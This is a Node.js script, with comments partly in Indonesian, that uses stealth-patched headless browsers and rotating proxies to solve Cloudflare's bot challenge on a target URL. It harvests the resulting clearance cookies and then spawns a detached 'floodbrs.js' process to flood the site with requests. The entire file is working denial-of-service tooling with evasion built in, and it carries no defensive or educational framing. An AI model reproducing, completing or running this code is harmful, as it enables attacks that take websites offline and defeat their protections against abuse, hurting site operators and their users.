const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserAgent = require('user-agents');
const { spawn } = require('child_process');

puppeteer.use(StealthPlugin());

// Command-line arguments
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

// Read proxies
const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        return [];
    }
};

// Generate user agent
const generateUserAgent = () => {
    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
    return userAgent.toString();
};

// Simple wait function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Cloudflare Cookie Class
class CloudflareCookie {
    constructor(cookieData) {
        this.name = cookieData.name || "";
        this.value = cookieData.value || "";
        this.domain = cookieData.domain || "";
        this.path = cookieData.path || "/";
        this.expires = cookieData.expires || 0;
        this.httpOnly = cookieData.httpOnly || false;
        this.secure = cookieData.secure || false;
        this.sameSite = cookieData.sameSite || "Lax";
    }

    static fromJSON(cookieData) {
        return new CloudflareCookie(cookieData);
    }

    toString() {
        return `${this.name}=${this.value}`;
    }
}

// Cari cookies Cloudflare
const findCloudflareCookies = (cookies) => {
    const cfCookies = cookies.filter(cookie => 
        cookie.name.includes('cf_') || 
        cookie.name.includes('_cf') ||
        cookie.name === 'cf_clearance'
    ).map(cookie => CloudflareCookie.fromJSON(cookie));
    
    return cfCookies;
};

// Advanced Cloudflare bypass
const advancedCloudflareBypass = async (page) => {
    try {
        // Tunggu 15-25 detik
        const waitTime = 15000 + Math.floor(Math.random() * 10000);
        await sleep(waitTime);

        // Check if already solved
        const title = await page.title();
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            return { success: true };
        }

        // Cari dan klik checkbox
        const clickSelectors = [
            'input[type="checkbox"]',
            '.hcaptcha-box',
            '[role="checkbox"]',
            '.cf-checkbox'
        ];

        for (const selector of clickSelectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    await element.click({ delay: 100 });
                    await sleep(8000);
                    break;
                }
            } catch (e) {
                continue;
            }
        }

        // Check final result
        await sleep(5000);
        const finalTitle = await page.title();
        if (!finalTitle.includes('Just a moment') && !finalTitle.includes('Checking your browser')) {
            return { success: true };
        }

        return { success: false };

    } catch (error) {
        return { success: false };
    }
};

// Process each browser
const processBrowser = async (proxy, index, total) => {
    let browser;
    try {
        const userAgent = generateUserAgent();
        
        const args = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--no-first-run',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--disable-web-security',
            '--window-size=1920,1080',
            `--user-agent=${userAgent}`
        ];

        browser = await puppeteer.launch({
            headless: true,
            args: args,
            ignoreHTTPSErrors: true
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1920, height: 1080 });

        // Basic stealth
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
        });

        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 60000 
        });

        // Solve Cloudflare
        const bypassResult = await advancedCloudflareBypass(page);
        if (!bypassResult.success) {
            await browser.close();
            return { success: false };
        }

        // Get success data
        const title = await page.title();
        const cookies = await page.cookies();
        const cfCookies = findCloudflareCookies(cookies);
        
        if (cfCookies.length === 0) {
            await browser.close();
            return { success: false };
        }

        const cookieString = cfCookies.map(cookie => cookie.toString()).join('; ');
        await browser.close();

        // LOG OUTPUT PERSIS SEPERTI YANG DIMINTA
        console.log(`[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : ${proxy} | useragent : ${userAgent} | cookies : ${cookieString} |`);
        console.log(`[ SPAWN ] Flood with cookies : ${cookieString} : useragent : ${userAgent}`);

        // Start flood
        spawn('node', [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            '1',
            proxyFile,
            cookieString,
            userAgent,
            'cf-cookie'
        ], {
            detached: true,
            stdio: 'ignore'
        });

        return { success: true };
        
    } catch (error) {
        if (browser) await browser.close();
        return { success: false };
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) return;

    for (let i = 0; i < proxies.length; i++) {
        await processBrowser(proxies[i], i + 1, proxies.length);
        
        if (i < proxies.length - 1) {
            await sleep(10000);
        }
    }

    await sleep(duration * 1000);
};

main().catch(() => {});
